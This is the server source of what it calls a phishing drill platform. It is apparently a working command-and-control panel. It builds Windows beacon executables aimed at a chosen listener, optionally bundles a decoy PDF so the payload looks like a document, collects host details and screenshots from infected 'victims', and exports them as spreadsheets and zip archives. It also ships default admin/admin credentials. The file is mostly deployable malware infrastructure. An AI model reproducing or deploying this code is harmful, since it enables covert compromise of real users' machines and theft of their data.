const express = require('express');
const session = require('express-session');
const bodyParser = require('body-parser');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const net = require('net');
const { exec } = require('child_process');
const XLSX = require('xlsx');
const http = require('http');
const archiver = require('archiver');

// 加载配置文件
const CONFIG_FILE = path.join(__dirname, 'config.json');
let config = {
    admin: { username: 'admin', password: 'admin' },
    server: { web_port: 8080, listener_port: 9090 }
};

// 如果配置文件不存在，创建默认配置
if (!fs.existsSync(CONFIG_FILE)) {
    fs.writeFileSync(CONFIG_FILE, JSON.stringify(config, null, 2));
    console.log('已创建默认配置文件: config.json');
} else {
    config = JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf-8'));
}

const SERVER_PORT = config.server.web_port;
const LISTENER_PORT = config.server.listener_port;
const ADMIN_USERNAME = config.admin.username;
const ADMIN_PASSWORD = config.admin.password;
const DATA_FILE = path.join(__dirname, 'data.json');

const app = express();
const upload = multer({ dest: 'uploads/' });

let listeners = {};
let victims = [];
let serverPublicIP = '0.0.0.0';

if (!fs.existsSync('temp')) fs.mkdirSync('temp');
if (!fs.existsSync('uploads')) fs.mkdirSync('uploads');
if (!fs.existsSync('screenshots')) fs.mkdirSync('screenshots');

// 获取服务器公网IP
function getServerPublicIP() {
    return new Promise((resolve) => {
        exec('curl -s ifconfig.me || curl -s icanhazip.com || curl -s ipinfo.io/ip', (error, stdout, stderr) => {
            if (!error && stdout) {
                serverPublicIP = stdout.trim();
                console.log(`Server Public IP: ${serverPublicIP}`);
                resolve(serverPublicIP);
            } else {
                console.log('Failed to get public IP, using 127.0.0.1');
                serverPublicIP = '127.0.0.1';
                resolve('127.0.0.1');
            }
        });
    });
}

function saveData() {
    try {
        const listenersConfig = {};
        for (const [id, listener] of Object.entries(listeners)) {
            listenersConfig[id] = {
                connect_ip: listener.connect_ip,
                bind_ip: listener.bind_ip,
                port: listener.port
            };
        }

        const dataToSave = {
            victims: victims,
            listeners: listenersConfig
        };

        fs.writeFileSync(DATA_FILE, JSON.stringify(dataToSave, null, 2));
    } catch (err) {
        console.error('Error saving data:', err);
    }
}

function startTCPListener(id, port, connectIp, bindIp = '0.0.0.0') {
    if (listeners[id] && listeners[id].server) {
        return; 
    }

    const server = net.createServer((socket) => {
        
        socket.on('data', (data) => {
            try {
                const rawStr = data.toString();
                const victimData = JSON.parse(rawStr);
                
                victimData['Socket来源IP'] = socket.remoteAddress.replace('::ffff:', '');
                victimData['公网信息'] = victimData['公网IP'] && victimData['公网IP'] !== 'N/A' 
                                        ? victimData['公网IP'] 
                                        : victimData['Socket来源IP'];
                
                if (!victimData['上线时间']) {
                    victimData['上线时间'] = new Date().toLocaleString();
                }

                const victimId = Date.now().toString();
                
                const mac = victimData['MAC地址'];
                const existIndex = victims.findIndex(v => v.data['MAC地址'] === mac);
                
                if (existIndex >= 0) {
                    victims[existIndex].data = victimData;
                    victims[existIndex].data['上线时间'] = new Date().toLocaleString();
                } else {
                    victims.unshift({ id: victimId, data: victimData });
                }


                saveData();

            } catch (e) {
                console.error("Error parsing beacon data:", e);
            }
        });

        socket.on('error', (err) => console.error(`Socket error: ${err.message}`));
    });

    try {
        server.listen(port, bindIp, () => {
            console.log(`Listener started on port ${port} (Connect IP: ${connectIp})`);
            listeners[id] = {
                connect_ip: connectIp,
                bind_ip: bindIp,
                port: port,
                server: server
            };
            saveData();
        });

        server.on('error', (err) => {
            console.error(`Failed to start listener on port ${port}: ${err.message}`);
        });
    } catch (e) {
        console.error(`Exception starting listener: ${e.message}`);
    }
}

function loadData() {
    if (fs.existsSync(DATA_FILE)) {
        try {
            const raw = fs.readFileSync(DATA_FILE);
            const data = JSON.parse(raw);

            if (data.victims) {
                victims = data.victims;
                console.log(`Restored ${victims.length} victims.`);
            }

            if (data.listeners) {
                let count = 0;
                for (const [id, config] of Object.entries(data.listeners)) {
                    startTCPListener(id, config.port, config.connect_ip, config.bind_ip);
                    count++;
                }
                console.log(`Restoring ${count} listeners...`);
            }
        } catch (err) {
            console.error('Error loading data:', err);
        }
    }
}


app.set('view engine', 'ejs');
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.raw({ type: 'image/jpeg', limit: '10mb' }));
app.use(express.static('public'));
app.use('/screenshots', express.static('screenshots'));
app.use(session({
    secret: 'lingxi-security-key',
    resave: false,
    saveUninitialized: true
}));

const requireAuth = (req, res, next) => {
    if (req.session.authenticated) next();
    else res.redirect('/login');
};


app.get('/login', (req, res) => res.render('login', { error: null }));

app.post('/login', (req, res) => {
    const { username, password } = req.body;
    if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
        req.session.authenticated = true;
        res.redirect('/');
    } else {
        res.render('login', { error: '用户名或密码错误' });
    }
});

app.post('/logout', (req, res) => {
    req.session.authenticated = false;
    res.redirect('/login');
});

app.get('/', requireAuth, (req, res) => {
    res.render('index', { listeners, victims, serverPublicIP });
});

app.get('/api/victims', requireAuth, (req, res) => {
    res.json(victims);
});

app.post('/clear_data', requireAuth, (req, res) => {
    victims = [];
    saveData(); 
    res.redirect('/');
});

app.post('/delete_victim', requireAuth, (req, res) => {
    const { victim_id } = req.body;
    
    // 查找要删除的victim并删除其截图文件
    const victim = victims.find(v => v.id === victim_id);
    if (victim && victim.data['截图文件']) {
        const screenshotPath = path.join(__dirname, 'screenshots', victim.data['截图文件']);
        if (fs.existsSync(screenshotPath)) {
            try {
                fs.unlinkSync(screenshotPath);
                console.log(`Deleted screenshot: ${victim.data['截图文件']}`);
            } catch (err) {
                console.error(`Failed to delete screenshot: ${err.message}`);
            }
        }
    }
    
    victims = victims.filter(v => v.id !== victim_id);
    saveData();
    res.json({ success: true });
});

// 上传截图 - 格式: IP_主机名_时间戳.jpg
app.post('/upload_screenshot/:ip/:hostname', (req, res) => {
    try {
        const ip = req.params.ip.replace(/\./g, '_');
        const hostname = req.params.hostname.replace(/[^a-zA-Z0-9\-_]/g, '_');
        const timestamp = Date.now();
        const filename = `${ip}_${hostname}_${timestamp}.jpg`;
        const filepath = path.join(__dirname, 'screenshots', filename);
        
        fs.writeFileSync(filepath, req.body);
        
        console.log(`Screenshot uploaded: ${filename}`);
        
        res.json({ 
            success: true, 
            filename: filename,
            url: `/screenshots/${filename}`
        });
    } catch (error) {
        console.error('Screenshot upload error:', error);
        res.status(500).json({ success: false });
    }
});

app.post('/create_listener', requireAuth, (req, res) => {
    const { ip, port } = req.body; 
    const portNum = parseInt(port);
    const id = Date.now().toString();

    startTCPListener(id, portNum, ip);
    
    setTimeout(() => res.redirect('/'), 500);
});

app.post('/delete_listener', requireAuth, (req, res) => {
    const { listener_id } = req.body;
    if (listeners[listener_id]) {
        if (listeners[listener_id].server) {
            listeners[listener_id].server.close();
        }
        delete listeners[listener_id];
        saveData();
    }
    res.redirect('/');
});

app.post('/generate_exe', requireAuth, upload.single('pdf_file'), (req, res) => {
    const { listener_id, include_pdf } = req.body;
    const listener = listeners[listener_id];

    if (!listener) return res.status(400).send("Listener not found");

    const sourcePath = path.join(__dirname, 'templates', 'beacon.cpp');
    let sourceCode = fs.readFileSync(sourcePath, 'utf8');

    const marker = "<<LAZYFISH_PDF_START>>";
    
    sourceCode = sourceCode.replace('{{SERVER_IP}}', listener.connect_ip); 
    sourceCode = sourceCode.replace('{{SERVER_PORT}}', listener.port);
    sourceCode = sourceCode.replace('{{PDF_MARKER}}', marker);
    sourceCode = sourceCode.replace('{{HAS_PDF}}', include_pdf ? 'true' : 'false');

    const tempSrcName = `beacon_${Date.now()}.cpp`;
    const tempSrcPath = path.join(__dirname, 'temp', tempSrcName);
    const outputExeName = `beacon_${Date.now()}.exe`;
    const outputExePath = path.join(__dirname, 'temp', outputExeName);

    fs.writeFileSync(tempSrcPath, sourceCode);

    const compileCmd = `x86_64-w64-mingw32-g++ "${tempSrcPath}" -o "${outputExePath}" -static -lws2_32 -liphlpapi -lgdiplus -mwindows -O2`;

    exec(compileCmd, (error, stdout, stderr) => {
        if (error) {
            console.error(`Compilation error: ${stderr}`);
            return res.status(500).send("Compilation failed. Check server logs.");
        }

        if (include_pdf && req.file) {
            try {
                const exeBuffer = fs.readFileSync(outputExePath);
                const pdfBuffer = fs.readFileSync(req.file.path);
                const markerBuffer = Buffer.from(marker);
                const finalBuffer = Buffer.concat([exeBuffer, markerBuffer, pdfBuffer]);
                fs.writeFileSync(outputExePath, finalBuffer);
                fs.unlinkSync(req.file.path);
            } catch (e) {
                return res.status(500).send("PDF Bundling failed.");
            }
        } else if (req.file) {
            fs.unlinkSync(req.file.path);
        }

        res.download(outputExePath, 'beacon.exe', (err) => {
            if (fs.existsSync(tempSrcPath)) fs.unlinkSync(tempSrcPath);
            if (fs.existsSync(outputExePath)) fs.unlinkSync(outputExePath);
        });
    });
});

// 导出上线机器信息为Excel和截图打包
app.get('/export_victims', requireAuth, (req, res) => {
    try {
        const timestamp = new Date().toISOString().replace(/[:.]/g, '-').slice(0, -5);
        const zipFilename = `上线主机数据_${timestamp}.zip`;
        const zipPath = path.join(__dirname, 'temp', zipFilename);

        // 创建zip压缩流
        const output = fs.createWriteStream(zipPath);
        const archive = archiver('zip', { zlib: { level: 9 } });

        output.on('close', () => {
            res.download(zipPath, zipFilename, (err) => {
                if (fs.existsSync(zipPath)) {
                    fs.unlinkSync(zipPath);
                }
            });
        });

        archive.on('error', (err) => {
            throw err;
        });

        archive.pipe(output);

        // 准备导出数据
        const exportData = victims.map((victim, index) => {
            const d = victim.data;
            return {
                '序号': index + 1,
                '主机名': d['主机名'] || 'Unknown',
                '用户名': d['用户名'] || 'Unknown',
                '公网IP': d['公网IP'] || 'N/A',
                'Socket来源IP': d['Socket来源IP'] || 'N/A',
                '内网IP': d['内网IP'] || 'N/A',
                'MAC地址': d['MAC地址'] || 'Unknown',
                '系统版本': d['系统版本'] || 'Unknown',
                '运行时间': d['运行时间'] || 'Unknown',
                '上线时间': d['上线时间'] || 'Unknown',
                '截图文件': d['截图文件'] || 'N/A'
            };
        });

        // 创建Excel
        const wb = XLSX.utils.book_new();
        const ws = XLSX.utils.json_to_sheet(exportData);
        const colWidths = [
            { wch: 6 }, { wch: 20 }, { wch: 20 }, { wch: 20 },
            { wch: 20 }, { wch: 30 }, { wch: 20 }, { wch: 25 },
            { wch: 15 }, { wch: 20 }, { wch: 30 }
        ];
        ws['!cols'] = colWidths;
        XLSX.utils.book_append_sheet(wb, ws, '上线主机列表');

        const excelFilename = `上线主机列表_${timestamp}.xlsx`;
        const excelPath = path.join(__dirname, 'temp', excelFilename);
        XLSX.writeFile(wb, excelPath);

        // 添加Excel到zip
        archive.file(excelPath, { name: excelFilename });

        // 添加截图到zip
        victims.forEach((victim, index) => {
            const screenshotFile = victim.data['截图文件'];
            if (screenshotFile) {
                const screenshotPath = path.join(__dirname, 'screenshots', screenshotFile);
                if (fs.existsSync(screenshotPath)) {
                    const hostname = victim.data['主机名'] || 'Unknown';
                    const mac = victim.data['MAC地址'] || 'Unknown';
                    const newName = `${index + 1}_${hostname}_${mac}.jpg`;
                    archive.file(screenshotPath, { name: `screenshots/${newName}` });
                }
            }
        });

        archive.finalize();

        // 清理临时Excel文件
        setTimeout(() => {
            if (fs.existsSync(excelPath)) {
                fs.unlinkSync(excelPath);
            }
        }, 5000);

    } catch (error) {
        console.error('Export error:', error);
        res.status(500).send('导出失败');
    }
});

loadData();

// 启动服务器并获取公网IP
getServerPublicIP().then(() => {
    app.listen(SERVER_PORT, () => {
        console.log(`凌曦安全钓鱼演练平台 running on port ${SERVER_PORT}`);
        console.log(`账号: ${ADMIN_USERNAME}`);
        console.log(`配置文件: ${CONFIG_FILE}`);
        console.log(`监听端口: ${LISTENER_PORT}`);
        console.log(`公网IP: ${serverPublicIP}`);
    });
});